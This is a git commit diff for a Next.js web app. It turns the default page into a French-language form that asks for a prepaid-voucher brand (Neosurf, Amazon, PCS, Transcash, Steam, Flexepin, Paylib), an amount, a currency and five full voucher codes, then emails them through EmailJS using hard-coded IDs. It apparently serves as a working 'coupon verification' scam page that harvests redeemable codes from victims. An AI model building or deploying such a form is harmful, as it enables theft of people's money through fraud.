fb94d630e2689fbd0fda0582617cac629ec03510
leudjeu prince <leudjeuprince@gmail.com>
2024-07-03 01:27:45 +0100

    end apllication v1

--- app/page.tsx
+++ app/page.tsx
@@ -1,113 +1,203 @@
-import Image from "next/image";
+"use client";
+import React, { useEffect } from "react";
+import { yupResolver } from "@hookform/resolvers/yup";
+import * as yup from "yup";
+import emailjs from 'emailjs-com';
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Select, SelectContent, SelectGroup, SelectItem, SelectLabel, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Controller, useForm } from "react-hook-form";
+import { useToast } from "@/components/ui/use-toast";
+import { Loader2 } from "lucide-react";
+
+const schema = yup.object().shape({
+  choix_recharge: yup.string().required("Choisir une recharge est requis"),
+  montant: yup.number().required("Montant recharge est requis"),
+  choix_device: yup.string().required("Choisir une device est requis"),
+  code_recharge1: yup.string().required("Code recharge 1 est requis")
+    .test('len', 'Code recharge 1 doit avoir la bonne taille', function (value) {
+
+      const { choix_recharge } = this.parent;
+      if (choix_recharge === 'STREAM' || choix_recharge === 'AMAZON') return value.length === 15;
+      if (choix_recharge === 'TRANSHSCASH') return value.length === 12;
+      return value.length === 10;
+    }),
+  code_recharge2: yup.string().required("Code recharge 2 est requis")
+    .test('len', 'Code recharge 2 doit avoir la bonne taille', function (value) {
+      const { choix_recharge } = this.parent;
+      if (choix_recharge === 'STREAM' || choix_recharge === 'AMAZON') return value.length === 15;
+      if (choix_recharge === 'TRANSHSCASH') return value.length === 12;
+      return value.length === 10;
+    }),
+  code_recharge3: yup.string().required("Code recharge 3 est requis")
+    .test('len', 'Code recharge 3 doit avoir la bonne taille', function (value) {
+      const { choix_recharge } = this.parent;
+      if (choix_recharge === 'STREAM' || choix_recharge === 'AMAZON') return value.length === 15;
+      if (choix_recharge === 'TRANSHSCASH') return value.length === 12;
+      return value.length === 10;
+    }),
+  code_recharge4: yup.string().required("Code recharge 4 est requis")
+    .test('len', 'Code recharge 4 doit avoir la bonne taille', function (value) {
+      const { choix_recharge } = this.parent;
+      if (choix_recharge === 'STREAM' || choix_recharge === 'AMAZON') return value.length === 15;
+      if (choix_recharge === 'TRANSHSCASH') return value.length === 12;
+      return value.length === 10;
+    }),
+  code_recharge5: yup.string().required("Code recharge 5 est requis")
+    .test('len', 'Code recharge 5 doit avoir la bonne taille', function (value) {
+      const { choix_recharge } = this.parent;
+      if (choix_recharge === 'STREAM' || choix_recharge === 'AMAZON') return value.length === 15;
+      if (choix_recharge === 'TRANSHSCASH') return value.length === 12;
+      return value.length === 10;
+    })
+});
+
 
 export default function Home() {
+  const {  control, handleSubmit, formState: { errors } } = useForm({
+    resolver: yupResolver(schema)
+  });
+  const { toast } = useToast();
+  const [isLoading, setIsLoading] = React.useState(false);
+  useEffect(() => {
+    emailjs.init('qX6nugXeKqhLjt9er');
+  }, []);
+  const onSubmit = (data: Record<string, unknown> | undefined) => {
+    setIsLoading(true);
+    emailjs.send('service_017gg5y', 'template_fvhgvvf', data,)
+      .then((result) => {
+        toast({
+          title: "Success",
+          description: "Votre coupon a bien été envoyé.",
+        });
+        setIsLoading(false);
+      }, (error) => {
+        setIsLoading(false);
+        toast({
+          variant: "destructive",
+          title: "Erreur",
+          description: "Une erreur est survenue. Veuillez réessayer.",
+        });
+      });
+  };
+
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 w-full max-w-5xl items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:size-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{" "}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
-        </div>
-      </div>
+    <main className="flex flex-col items-center justify-between px-4 bg-gradient-to-b from-[#955de4] to-[#2b33c4] py-3 w-full h-full">
+      <div className="p-5 rounded-lg border bg-white">
+        <span className="my-5 text-lg">Veuillez entrer les informations </span>
+        <span className="text-lg text-blue-600">du coupons ici </span>
+        <form className="w-full flex flex-col" onSubmit={handleSubmit(onSubmit)}>
+          <Label htmlFor="choix_recharge" className="my-1">Choisir une recharge</Label>
+          <Controller
+            name="choix_recharge"
+            control={control}
 
-      <div className="relative z-[-1] flex place-items-center before:absolute before:h-[300px] before:w-full before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-full after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 sm:before:w-[480px] sm:after:w-[240px] before:lg:h-[360px]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
+            render={({ field }) => (
+              <Select {...field} {...field} onValueChange={field.onChange}>
+                <SelectTrigger className="w-full">
+                  <SelectValue placeholder="Select a recharge" />
+                </SelectTrigger>
+                <SelectContent>
+                  <SelectGroup>
+                    <SelectLabel>Recharge Options</SelectLabel>
+                    <SelectItem value="NEOSURF">NEOSURF</SelectItem>
+                    <SelectItem value="AMAZON">AMAZON</SelectItem>
+                    <SelectItem value="PCS">PCS</SelectItem>
+                    <SelectItem value="TRANSHSCASH">TRANSHSCASH</SelectItem>
+                    <SelectItem value="STREAM">STREAM</SelectItem>
+                    <SelectItem value="FLEXEPIN">FLEXEPIN</SelectItem>
+                    <SelectItem value="PAYLIB">PAYLIB</SelectItem>
+                  </SelectGroup>
+                </SelectContent>
+              </Select>
+            )}
+          />
+          {errors.choix_recharge && <p className="text-red-500">{errors.choix_recharge.message}</p>}
 
-      <div className="mb-32 grid text-center lg:mb-0 lg:w-full lg:max-w-5xl lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Docs{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-sm opacity-50">
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
+          <Label htmlFor="montant" className="my-5">Montant recharge</Label>
+          <Controller
+            name="montant"
+            control={control}
+            render={({ field }) => (
+              <Input {...field} type="number" placeholder="Montant recharge" />
+            )}
+          />
+          {errors.montant && <p className=" text-red-500">{errors.montant.message}</p>}
 
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Learn{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-sm opacity-50">
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
+          <Label htmlFor="choix_device" className="my-5">Choisir une device</Label>
+          <Controller
+            name="choix_device"
+            control={control}
+            render={({ field }) => (
+              <Select {...field} {...field} onValueChange={field.onChange}>
+                <SelectTrigger className="w-full">
+                  <SelectValue placeholder="Choisir un device" />
+                </SelectTrigger>
+                <SelectContent>
+                  <SelectGroup>
+                    <SelectLabel>Device</SelectLabel>
+                    <SelectItem value="Euro">Euro</SelectItem>
+                    <SelectItem value="Dollars">Dollars</SelectItem>
+                    <SelectItem value="FrancSuisse">Franc Suisse (CHF)</SelectItem>
+                  </SelectGroup>
+                </SelectContent>
+              </Select>
+            )}
+          />
+          {errors.choix_device && <p className=" text-red-500">{errors.choix_device.message}</p>}
 
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Templates{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-sm opacity-50">
-            Explore starter templates for Next.js.
-          </p>
-        </a>
+          <Label htmlFor="code_recharge" className="my-5">Entrer les code de recharges</Label>
+          <Controller
+            name="code_recharge1"
+            control={control}
+            render={({ field }) => (
+              <Input {...field} type="text" className="my-5" placeholder="code recharge 1" />
+            )}
+          />
+          {errors.code_recharge1 && <p className=" text-red-500">{errors.code_recharge1.message}</p>}
 
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className="mb-3 text-2xl font-semibold">
-            Deploy{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className="m-0 max-w-[30ch] text-balance text-sm opacity-50">
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
+          <Controller
+            name="code_recharge2"
+            control={control}
+            render={({ field }) => (
+              <Input {...field} type="text" className="my-5" placeholder="code recharge 2" />
+            )}
+          />
+          {errors.code_recharge2 && <p className=" text-red-500">{errors.code_recharge2.message}</p>}
+
+          <Controller
+            name="code_recharge3"
+            control={control}
+            render={({ field }) => (
+              <Input {...field} type="text" className="my-5" placeholder="code recharge 3" />
+            )}
+          />
+          {errors.code_recharge3 && <p className=" text-red-500">{errors.code_recharge3.message}</p>}
+
+          <Controller
+            name="code_recharge4"
+            control={control}
+            render={({ field }) => (
+              <Input {...field} type="text" className="my-5" placeholder="code recharge 4" />
+            )}
+          />
+          {errors.code_recharge4 && <p className=" text-red-500 ">{errors.code_recharge4.message}</p>}
+
+          <Controller
+            name="code_recharge5"
+            control={control}
+            render={({ field }) => (
+              <Input {...field} type="text" className="my-5" placeholder="code recharge 5" />
+            )}
+          />
+          {errors.code_recharge5 && <p className=" text-red-500">{errors.code_recharge5.message}</p>}
+
+          <Button disabled={isLoading} type="submit" className="my-5 bg-blue-600"> {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : "Envoyer"} </Button>
+        </form>
       </div>
     </main>
   );
 }
+
+
